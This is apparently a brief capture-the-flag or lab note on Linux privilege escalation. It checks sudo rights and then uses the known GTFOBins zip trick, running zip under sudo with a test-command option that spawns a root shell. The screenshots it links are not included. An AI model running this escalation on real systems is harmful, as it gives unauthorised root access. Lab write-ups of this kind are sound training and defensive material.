```bash
sudo -l
```
![[Pasted image 20240823184041.png]]

Using gtfobins for zip (sudo)
```bash
TF=$(mktemp -u)
sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
```
![[Pasted image 20240823184221.png]]
